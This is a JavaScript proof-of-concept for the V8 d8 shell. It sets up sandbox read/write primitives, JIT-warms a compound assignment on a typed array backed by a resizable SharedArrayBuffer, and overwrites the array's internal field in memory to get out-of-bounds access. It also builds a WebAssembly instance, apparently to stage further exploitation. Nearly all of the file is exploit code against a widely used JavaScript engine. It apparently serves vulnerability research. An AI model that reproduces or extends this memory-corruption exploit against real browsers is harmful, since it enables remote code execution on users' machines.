// r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/test3.js

let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }



const gsab = new SharedArrayBuffer(0x16,{"maxByteLength":0x4242});
const u16arr = new Uint16Array(gsab,0x10);
// u16arr[1] = 1;
// console.log(u16arr[1]);

function foo(obj,index, val) {
    obj[index] += val;
    return obj[index];

}

function test(iii,val) {
    return foo(u16arr, iii, val);
}

for (var i = 0; i < 0x10000; ++i) {
    test(1,0);
}
// %DebugPrint(gsab);
%DebugPrint(u16arr);
console.log(addrOf(u16arr));
console.log(v8_read64(addrOf(u16arr)+0x17));

v8_write64(addrOf(u16arr)+0x19,0x2e00000n);

%DebugPrint(u16arr);
d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
const builder = new WasmModuleBuilder();
let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);

builder.addFunction("func0", $sig_i_l).exportFunc().addBody([ // function 1 convert from int32 to int64
  kExprLocalGet, 0,
  kExprI32ConvertI64,
]);
let instance = builder.instantiate();

console.log("===============================================================");
%DebugPrint(instance);
instance.exports.func0(0n);


%SystemBreak();

var ret = test(0x123,0);
console.log(ret);